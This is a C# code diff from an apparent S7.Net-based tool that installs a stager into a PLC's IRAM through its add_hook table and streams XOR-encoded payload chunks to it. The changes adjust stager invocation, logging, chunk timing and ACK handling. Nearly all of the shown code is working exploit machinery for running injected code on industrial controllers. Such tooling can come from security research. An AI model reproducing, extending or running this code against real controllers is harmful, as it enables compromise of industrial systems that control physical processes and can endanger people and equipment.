@@ -248,11 +248,11 @@ namespace S7.Net
 
             await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
 
-            // Immediately invoke stager to reset protocol state (Python style); no delay/buffer flush
-            _log("[PROTOCOL] Invoking stager add_hook after install...");
-            var stagerResponse = await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, Array.Empty<byte>(), true);
-            _log($"[PROTOCOL] Stager invocation response: {(stagerResponse != null ? BitConverter.ToString(stagerResponse) : "<null>")}");
             _log("Stager installation complete.");
+            _log($"[PROTOCOL] ✅ Stager installed at hook index 0x{PlcConstants.DEFAULT_STAGER_ADDHOOK_IND:X2}");
+            _log($"[PROTOCOL] Hook table address: 0x{PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2:X8}");
+            _log($"[PROTOCOL] Stager code address: 0x{PlcConstants.IRAM_STAGER_START:X8}");
+            _log("[PROTOCOL] 🎯 Stager is ready for use");
         }
         #endregion
 
@@ -293,55 +293,33 @@ namespace S7.Net
             int maxChunkSize = PlcConstants.MAX_MSG_LEN - 1;
             for (int i = 0; i < msg.Length; i += maxChunkSize)
             {
+                // Add safety delay between chunks (matches Python SEND_REQ_SAFETY_SLEEP_AMT)
+                await Task.Delay(10);
+                
                 int size = Math.Min(maxChunkSize, msg.Length - i);
                 var chunk = new byte[size];
                 Array.Copy(msg, i, chunk, 0, size);
 
-                _log($"[BYTES] Sending chunk at offset {i}, size {size}: {BitConverter.ToString(chunk)}");
+                _log($"[BYTES] Send progress: 0x{i:X6}/0x{msg.Length:X6} ({(float)i/msg.Length:P2})");
                 var encoded = EncodePacketForStager(chunk);
                 _log($"[BYTES] Encoded chunk (with XOR key): {BitConverter.ToString(encoded)}");
                 await _protocol.SendPacketAsync(encoded, 8, 10);
                 _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");
 
-                byte[]? ack = null;
-                int ackTryCount = 0;
-                while (true)
+                var ack = await _protocol.ReceivePacketAsync();
+                if (ack == null || ack.Length != 1)
                 {
-                    try
-                    {
-                        ack = await _protocol.ReceivePacketAsync();
-                    }
-                    catch (Exception exc)
-                    {
-                        _log($"[BYTES][ERROR] Exception waiting for ACK: {exc.Message}");
-                        throw;
-                    }
-                    if (ack == null)
-                    {
-                        _log("[BYTES][ERROR] Null ACK received.");
-                        throw new Exception($"Null ACK from stager at chunk offset {i}");
-                    }
-                    _log($"[BYTES][ACK RAW] Length={ack.Length}, Value={BitConverter.ToString(ack)}");
-                    if (ack.Length == 1)
-                    {
-                        byte ackValue = ack[0];
-                        _log($"[BYTES][ACK] Value received: 0x{ackValue:X2}");
-                        if (ackValue == 0xFF)
-                        {
-                            _log("[BYTES][WARNING] Received interrupt ACK (0xFF). Aborting.");
-                            throw new Exception("Interrupt ACK (0xFF)");
-                        }
-                        break; // valid ACK
-                    }
-                    else
-                    {
-                        _log($"[BYTES][SKIP] Ignoring non-ACK packet: {BitConverter.ToString(ack)}");
-                        ackTryCount++;
-                        if (ackTryCount > 10) throw new Exception("Did not get chunk ACK after 10 packets");
-                        // keep looking for the real ACK
-                    }
+                    _log($"[BYTES][ERROR] Expected single-byte ACK, got: {(ack != null ? BitConverter.ToString(ack) : "<null>")}");
+                    throw new Exception($"Did not receive expected empty ACK from stager at chunk offset {i}");
                 }
-                // Accept any single-byte ACK as valid
+                
+                byte ackValue = ack[0];
+                _log($"[BYTES][ACK] Value received: 0x{ackValue:X2}");
+                if (ackValue == 0xFF)
+                {
+                    _log("[BYTES][WARNING] Received interrupt ACK (0xFF). Aborting.");
+                    throw new Exception("Interrupt ACK (0xFF)");
+                }
             }
             // Send empty packet to signify end of transmission
             var endPacket = EncodePacketForStager(Array.Empty<byte>());
